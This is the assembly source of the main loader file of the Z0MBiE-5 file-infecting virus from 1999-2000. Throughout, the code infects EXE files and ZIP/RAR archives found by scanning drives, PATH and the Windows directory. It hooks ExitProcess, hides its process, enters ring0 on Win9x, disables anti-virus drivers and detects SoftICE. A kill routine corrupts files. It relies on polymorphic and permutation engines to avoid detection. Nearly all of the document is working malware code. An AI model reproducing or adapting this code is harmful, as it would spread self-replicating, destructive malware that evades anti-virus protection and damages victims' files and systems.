
; ===========================================================================
; Z0MBiE-5 virus        build 017        (x) 1999-2000, http://z0mbie.cjb.net
; ===========================================================================

; main file/virus loader. action: infect TEST.EXE

; *** before compiling fully working virus, comment the following lines ***

;DEBUG                  equ     ?   ; assemble INT3 opcodes, etc.
;TESTFILE               equ     ?   ; only action: infect TESTFILE.EXE & quit
;DEBUG_DUMP             equ     ?   ; dump permutated code to _rpme.tmp
;USE_C                  equ     ?   ; use 'c:\' debug path instead of q:\xxx

DATA_RVA                equ     2000h   ; .data RVA

CODESIZE1               equ     65536   ; size of permutated buffer
CODESIZE2               equ     262144  ; size of polymorphized buffer
MAXMEM                  equ     655360  ; size of RPME heap

GROWSTACK               equ     100000h
GROWHEAP                equ     100000h

include                 INCLUDE\mz.inc          ; MZ-header
include                 INCLUDE\pe.inc          ; PE-header
include                 INCLUDE\kme32\kme32int.inc    ; KME32 consts

include                 INCLUDE\macro.inc  ; common macros
include                 INCLUDE\s2c.inc    ; macro: x_stosd,x_push,x_pop,...
include                 INCLUDE\seh.inc    ; SEH macros

if_first                macro   lbl
                        cmp     is_firststart, 1
                        je      lbl
                        endm
if_not_first            macro   lbl
                        cmp     is_firststart, 1
                        jne     lbl
                        endm

MEM_COMMIT              equ     00001000h
MEM_RESERVE             equ     00002000h
PAGE_EXECUTE_READWRITE  equ     00000040h


                        p386
                        model   flat
                        locals  __
                        jumps

; DATA segment (containing the virus); should be at RVA=DATA_RVA

                        .data

start:

; debug stuff
include                 INCLUDE\DEBUG\debug.zmb  ; debug messages, etc.
include                 INCLUDE\DEBUG\debug.inc  ; debug macros, code

; RSA-related shit
include                 INCLUDE\RSALIB\rsalib.inc  ; bignumbers management
include                 INCLUDE\RSALIB\rsasux.inc  ;-)

; viral stuff
include                 INCLUDE\infect.inc      ; file infection
include                 INCLUDE\fioexlow.inc    ; file io routines
include                 INCLUDE\export.inc      ; kernel export analyzer
include                 INCLUDE\rnd.inc         ; randomer
include                 INCLUDE\recserch.inc    ; recursive file search
include                 INCLUDE\explorer.inc    ; explorer.exe-related stuff
include                 INCLUDE\import.inc      ; import analyzer
include                 INCLUDE\kill.inc      ; the only way to feel allright
include                 INCLUDE\getargv0.inc  ; read curr host file into mem
; ring0-stuff
include                 INCLUDE\ring0.inc       ; enter ring0 (win9X)
include                 INCLUDE\find_ldt.inc    ; LDT-related stuff (win9X)
include                 INCLUDE\killavxd.inc    ; AV VxD killer (r0/win9X)
include                 INCLUDE\fuckice.inc     ; softice support (r0/win9X)

; engines
include                 INCLUDE\LDE32\lde32bin.inc ; LDE32 (disassembler)
include                 INCLUDE\KME32\kme32.inc ; KME32 (polymorphic engine)
include                 INCLUDE\ETG\etg.inc ; ETG (Executable Trash Generator)
include                 INCLUDE\PRCG\prcg.inc ; PRCG (Cycle Generator)

; archivez support
include                 INCLUDE\ARCLIB\rarlib.inc ; .RAR archives management
include                 INCLUDE\ARCLIB\ziplib.inc ; .ZIP archives management
include                 INCLUDE\xcrc32.inc ; crc32

; permutation
include                 INCLUDE\RPME\rpme_asm.inc ; RPME -- constants
include                 INCLUDE\RPME\rpme-krn.inc ; RPME -- kernel
include                 INCLUDE\RPME\rpme-mut.inc ; RPME -- mutator
include                 INCLUDE\usermut.inc ; external (not RPME's) mutator

; code pervertor
include                 INCLUDE\pervert.inc ; code pervertor lib

; gencopy
include                 gencopy.inc     ; polymorphic copy generator



import                  macro   x      ; process one import (x=procname)
                        mov_h   eax, x  ; calc hash
                        call    edx
                        stosd
                        endm

get_ex_all:
                        call    get_ex_base

                        pusho   my_findfunc
                        pop     edx
                        lea     edi, xx_first
                        cld

include                 INCLUDE\im1.inc         ; import stuf

                        ret

my_findfunc:            push    edi
                        push    edx
                        xchg    edi, eax
                        call    findfunc
                        pop     edx
                        pop     edi
                        jnz     __ok
                        pop     eax
__ok:                   ret

antiemul:               pusha
                        seh_init_nodebugmsg
                        xor     edx, edx
                        div     edx
                        jmp     antiemul
                        seh_done_nodebugmsg
                        popa
                        ret


init_first:             ; DROPPER's code only (first start).

 ; UPXed shit, PE objecttable destroyed
                        mov     ecx, CODESIZE1
                        mov     ebp, 00404200h              ; ***HARDCODED***

                        jmp     init_real

init_nopoly:
                       ; not encrypted (no poly shit at all)
                        call    findme

                        mov     ebp, edi
                        jmp     init_real

init_std:

                        xor     ecx, ecx        ;; 'coz no KME used
                        jz      init_nopoly     ;;

                        ; we're on the stack, get @start
                        lea     ebp, [esp + 12345678h]  ; delta_esp
                        jmp     init_real

init_real:
                        call    antiemul

                        seh_init_nodebugmsg     ; install seh

                        call    get_ex_base     ; EBX=kernel base,ECX=exptbl

                        neg     ebx
                        cmp     ebx, -0BFF70000h        ; exit if winNT
                        jne     __back2host
                        neg     ebx

                        mov_h   edi, VirtualAlloc  ; get proc address
                        call    findfunc
                        jz      __error

                        push    PAGE_EXECUTE_READWRITE  ; allocate memory
                        push    MEM_RESERVE+MEM_COMMIT
                        push    vir_memory+DATA_RVA
                        push    offset start-DATA_RVA  ; must be 64k-aligned!
                        call    eax             ; also init memory to zero

                        or      eax, eax
                        jz      __error

                        mov     esi, ebp            ; copy virus to abs addr
                        lea     edi, start          ; @start
                        mov     ecx, CODESIZE1/4
                        cld
                        rep     movsd

                        pusho   __copied            ; jmp to new location
                        pop     eax
                        sub     eax, ebp
                        add     eax, offset start
                        jmp     eax
__copied:

                        call    get_ex_all          ; process our imports
                        jz      __error

                        debugmsg startup
                        debugmsg kexpok

                        call    alloc_some_mem

                        call    randomize
                        debugmsg randomize, randseed

;                       mov     is_firststart, 0   ; alredy 0

                        downgrade __skipzeroold
                        call    zeroold
__skipzeroold:


                        call    get_old_eip     ; eax<--host's eip
                        xchg    ebx, eax
                        call    find_mz         ; get imagebase
                        cmp     byte ptr [ebx].mz_csum, 'ð' ;archive dropper?
                        jne     __skipad

                        seh_done_nolab
                        jmp     archive_dropper
__skipad:

                        downgrade __skip_r0
                        rnd     17
                        jz      __skip_r0

                        call    callring0       ; execute ring0 stuff
__skip_r0:

        IFDEF   TESTFILE
                        x_push  edx, TESTFILE.EXE~
                        mov     edx, esp
                        call    infect_exe_file
                        x_pop
                        or      esp, esp
                        jnz     __anyway        ; same as jmp here
        ENDIF

                        downgrade __s2
                        call    get_old_eip     ; eax<--eip
                        cmp     dword ptr [eax], 90909090h ; dropper?
                        jz      __way2  ; - go to thread-related shit
__s2:

                        downgrade __s1
                        rnd     97
                        jz      __anyway        ; do nothing
__s1:

                        call    get_old_eip     ; eax<--eip
                        xchg    ebx, eax
                        call    find_mz                 ; get imagebase
                        mov     eax, [ebx].mz_neptr
                        cmp     [ebx+eax].pe_subsystem, 3 ; cui?
                        je      __way1  ; - go to exitprocess stuff

                        rnd     5
                        jz      __way2 ; go to thread

__way1:
                        call    get_old_eip     ; eax<--host's eip
                        xchg    ebx, eax
                        call    find_mz                 ; get imagebase
                        call    find_exitprocess        ; hook @[exitprocess]
                        jc      __way2    ; not found
                        xchg    esi, eax

                        debugmsg way1

                        push    0                       ; make writeable
                        push    PAGE_EXECUTE_READWRITE
                        push    4
                        push    esi
                        call    xxVirtualProtect

                        pusho   exitprocessfunc         ; dispatch
                        pop     dword ptr [esi]

                        jmp     __anyway

__way2:
                        debugmsg way2

                        debugmsg creath

                        push    ecx                     ; create own thread
                        push    esp
                        push    0
                        push    0
                        pusho   threadfunc
                        push    128*1024    ; stack
                        push    0
                        call    xxCreateThread
                        pop     ecx

                        or      eax, eax
                        jz      __error
__anyway:
__error:

__back2host:
                        seh_done                ; uninstall seh

                        debugmsg ret2host
                        debugmsg getkey

                     ;  call    get_old_eip
                     ;  xchg    ebx, eax
                     ;  call    find_mz
                     ;  add     ebx, [ebx].mz_neptr
                     ;  add     esp, [ebx+44h]
                     ;  and     esp, not 3
                     ;  mov     ebp, esp

                        call    get_old_eip
                        call    eax             ; back to host
                        jmp     exitpr

get_old_eip:            push    12345678h   ; ** FIXED opcodes
                        pop     eax         ; ** do not change
                        ret                 ; ** used in usermut.inc

  ; zero viral code (in current file in memory & in the stack)

zeroold:
                        seh_init

                        debugmsg fill0z

                        call    findme

                        pusha
                        push    0                       ; make writeable
                        push    PAGE_EXECUTE_READWRITE
                        push    ecx
                        push    edi
                        call    xxVirtualProtect
                        popa

                        xor     eax, eax ; fill virus (in file) with 0z
                        shr     ecx, 2
                        cld
                        rep     stosd

; zero old copy in the stack

                        mov     edi, ebp
                        mov     ecx, CODESIZE1/4
                        rep     stosd

                        seh_done

                        ret

findme:                 call    get_old_eip     ; eax<--host's eip
                        xchg    ebx, eax
                        call    find_mz         ; get imagebase (-->EBX)

                        mov     eax, [ebx].mz_neptr  ; EAX<-PE header
                        add     eax, ebx

                        movzx   ecx, [eax].pe_numofobjects
                        imul    ecx, size oe_struc        ;ECX<-last ObjEntry
                        movzx   esi, [eax].pe_ntheadersize
                        lea     ecx, [ecx+esi+18h-(size oe_struc)]

                        mov     edi, [eax+ecx].oe_virt_rva
                        add     edi, [eax+ecx].oe_phys_size

                        mov     ecx, [eax+ecx].oe_xxx
                        rol     ecx, 23
                        neg     ecx

                        sub     edi, ecx
                        add     edi, ebx

                        ret


alloc_some_mem:         push    CODESIZE2
                        push    0       ; GMEM_FIXED
                        call    xxGlobalAlloc
                        mov     tmp_ptr, eax

                        push    CODESIZE2
                        push    0
                        call    xxGlobalAlloc
                        mov     buf_ptr, eax

                        push    MAXMEM
                        push    0
                        call    xxGlobalAlloc
                        mov     mem_ptr, eax

                        debugmsg memok, CODESIZE2*2+MAXMEM

                        ret

  ; after hooked exitprocess we 're here

exitprocessfunc:
                        debugmsg epfunc
                        cld

                        seh_init                        ; install seh

                        mov     vtype, VT_PROCESS

                        call    get_ex_base     ; EBX=kernel base,ECX=exptbl
                        mov_h   edi, RegisterServiceProcess
                        call    findfunc  ; get proc address
                        jz      __skipserv
                        xchg    esi, eax

                        call    xxGetCurrentProcessId
                        push    1
                        push    eax
                        call    esi                      ; hide process
__skipserv:

                        debugmsg servok

                        call    scanner                 ; scan all

                        seh_done                        ; uninstall seh

                        debugmsg epexit

                        debugmsg getkey

__exit2md:
exitpr:                 push    -1                      ; exit process
                        call    xxExitProcess

  ; virus's thread (works while current process is running)

threadfunc:
                        debugmsg thfunc

                        seh_init

                        mov     vtype, VT_THREAD

                        call    scanner                 ; scan all

                        seh_done

                        debugmsg thexit

                        debugmsg getkey

                        push    -1                      ; exit thread
                        call    xxExitThread

 ; .ZIP/.RAR archive dropper code:
 ; re-execute commandline butchange .EXE --> .EX_
 ; after that go to serviceprocess- shit

archive_dropper:
                        debugmsg adstart

                        seh_init

                        call    xxGetCommandLineA
                        xchg    esi, eax
                        lea     edi, cmdline
                        mov     edx, edi
__1:                    lodsb
                        stosb
                        mov     ebx, [edi-4]
                        or      ebx, 20202000h
                        neg     ebx
                        cmp     ebx, -'exe.'
                        jne     __2
                        mov     byte ptr [edi-1], '_'
__2:                    or      al, al
                        jnz     __1

                        debugmsg adrun, edx

                        push    40h
                        pop     dword ptr startinfo     ; struct length

                        xor     eax, eax
                        push    offset procinfo
                        push    offset startinfo
                        push    eax eax eax  eax eax eax
                        push    edx  ; offset cmdline
                        push    eax
                        call    xxCreateProcessA

                        debugmsg adexit

                        seh_done

                        jmp     exitprocessfunc

  ; scanning subroutine

scanner:
                        fake

                        downgrade scanner_main

                        cmp     vtype, VT_PROCESS
                        jne     scanner_main
  ; use atoms only for processes ('coz thread worktime unknown and we cant
  ; be sure that atom will be deleted)

                        rnd     31
                        jz      scanner_main    ; skip atom-related shit

                        xor     eax, eax
                        sub     eax, -'BA'
                        lea     esi, atomstring
                        mov     [esi], eax

                        debugmsg gfa, esi

__cycle:                push    esi
                        call    xxGlobalFindAtomA
                        or      eax, eax
                        jz      __free   ; no such atom

                        debugmsg gfafound

                        rnd     60
                        add     eax, 10
                        imul    eax, 1000

                        debugmsg sleep,eax

                        push    eax             ; pause 10..60 sec
                        call    xxSleep

                        jmp     __cycle
__free:

                        debugmsg  gfanot

                        push    offset atomstring
                        call    xxGlobalAddAtomA
                        mov     atomhandle, eax

                        call    scanner_main

                        push    atomhandle
                        call    xxGlobalDeleteAtom

                        debugmsg gfadel

                        ret

scanner_main:
                        fake

                        debugmsg scaninit

                        downgrade __killsleep1

                        rnd     10
                        inc     eax
                        imul    eax, 1000

                        debugmsg sleep, eax

                        push    eax             ; pause 1..10 sec
                        call    xxSleep
__killsleep1:
                        lea     edi, ff

                        downgrade __skip0
                        rnd     9
                        jz      __skip0
                        debugmsg pexplorer
                        call    process_explorer ; explorer.exe
__skip0:

                        downgrade __skip1
                        rnd     31
                        jz      __skip1
                        debugmsg pfilez
                        call    process_filez   ; files of a given names
__skip1:

                        downgrade __skip_r0_2
                        rnd     18
                        jz      __skip_r0_2
                        call    callring0_2     ; execute ring0 stuff (ver.2)
__skip_r0_2:

                        downgrade __skip2
                        rnd     19
                        jz      __skip2
                        debugmsg pwindir
                        call    process_windir  ; %windir%
__skip2:

                        downgrade __skip3
                        rnd     23
                        jz      __skip3
                        debugmsg ppath
                        call    process_path    ; PATH
__skip3:
                        downgrade __skip4
                        rnd     57
                        jz      __skip4
                        debugmsg pdrives
                        call    process_drives  ; all other files
__skip4:
                        debugmsg scanexit

                        ret

  ; this handler receives request for file infection
  ; input: EDX=filename

infect_handler:         pusha

                        fake

                        downgrade __skip1
                        rnd     13
                        jz      __exit
__skip1:

                        cmp     infect_type, IT_EXE
                        je      __exe

                        call    getargv0        ; load dropper

                        cmp     infect_type, IT_RAR
                        je      __rar
                        cmp     infect_type, IT_ZIP
                        je      __zip

                        int 3
                        int 3
                        int 3
                        jmp     __exit

__rar:                  downgrade __exit
                        call    process_rar

                        jmp     __exit

__zip:                  downgrade __exit
                        call    process_zip

                        jmp     __exit

__exe:                  downgrade __exit
                        call    infect_exe_file     ; takes some seconds

                        test    al, IX_TIMEUSED
                        jz      __exit

__sleep3:
                        downgrade __exit

                        debugmsg sleep,3*1000
                        push    3*1000          ; pause if file infected
                        call    xxSleep

__exit:                 popa
                        ret

  ; this handler receives request for file fuckup
  ; input: EDX=filename

kill_handler:
                        downgrade __skipkill

                        pusha

                        fake

                        downgrade __dn
                        rnd     11
                        jz      __exit
__dn:

                        call    kill_file       ; kill file (insert shit)

                        downgrade __exit

                        debugmsg sleep,1*1000
                        push    1*1000
                        call    xxSleep

__exit:                 popa

__skipkill:             ret

i_c_s                   equ     $-start
                        db      CODESIZE1-i_c_s dup (?)

; ---------------------------------------------------------------------------

                        db      1024 dup (?)

; ---------------------------------------------------------------------------

include                 INCLUDE\im2.inc         ; import stuff

ff                      ff_struc ?

is_firststart           dd      ?
randseed                dd      ?

old_eip                 dd      ?       ; while infecting-generating copy
delta_esp               dd      ?       ; --//--   [see usermut.inc]

VT_PROCESS              equ     1
VT_THREAD               equ     2
vtype                   db      ?

IT_EXE                  equ     -'Z'     ;-)
IT_RAR                  equ     -'E'
IT_ZIP                  equ     -'R'
infect_type             db      ?

argv0_filename          db      512 dup (?)
argv0_ptr               dd      ?
argv0_size              dd      ?

atomstring              dd      ?
atomhandle              dd      ?

t1_size                 dd      ?       ; trash size
oentry                  dd      ?

startinfo               dd      ?,40h/4 dup (?) ; somebody has a bug here (/4)
procinfo                dd      ?,?,?,?

save_esp                dd      ?
save_eip                dd      ?
save_cs                 dd      ?

kavxd_killhandler       dd      ?

fucking_stack           dd      ?

usermut_complete        dd      ?

ldtpage                 db      LDT_SCANSIZE dup (?)

cmdline                 label   byte            ; ...
ldetbl                  db      2048 dup (?)

; permutation-buffer
;tmp                    db      CODESIZE2 dup (?)
tmp_ptr                 dd      ?
tmp_size                dd      ?
tmp_entry               dd      ?

; polymorphic buffer
;buf                    db      CODESIZE2 dup (?)
buf_ptr                 dd      ?
buf_entry               dd      ?
buf_size                dd      ?

; used by internal malloc()
mem_count               dd      ?
mem_ptr                 dd      ?
;mem_buf                db      MAXMEM dup (?)

rsa_data:
rsa_x                   dd      13 dup (?)
rsa_d                   dd      13 dup (?)
rsa_n                   dd      13 dup (?)
rsa_y                   dd      13 dup (?)
rsa_data_size           equ     $-rsa_data

IFDEF   DEBUG
_is_debugstrings        db      ?
_debugstrings_size      dd      ?
_debugstrings_data      db      65536 dup (?)
ENDIF

vir_memory              equ     $-start

                        .code

loader:


                        lea     esi, start      ; PAGEIN
                        mov     ecx, vir_memory
                        rep     lodsb

                        mov     is_firststart, 1

                        call    get_ex_all
                        jz      __error

                        debugmsg startup

                        call    alloc_some_mem

                        call    randomize

                        lea     edx, fname_exe
                        call    infect_exe_file

                        lea     edx, binform
                        call    fcreate
                        xchg    ebx, eax
                        mov     edx, buf_ptr
                        mov     ecx, buf_size
                        call    fwrite
                        call    fclose

__exit:                 push    -1
                        call    xxExitProcess

__error:                int 3
                        ret

fname_exe               db      'test.exe',0
binform                 db      'test.bin',0

db 3 dup (13,10)
db ';------------------------------',13,10
db 'initial code size = '
db i_c_s/10000 mod 10+'0'
db i_c_s/ 1000 mod 10+'0'
db i_c_s/  100 mod 10+'0'
db i_c_s/   10 mod 10+'0'
db i_c_s/    1 mod 10+'0'
db 13,10
db ';------------------------------',13,10
db 3 dup (13,10)

                        end     loader
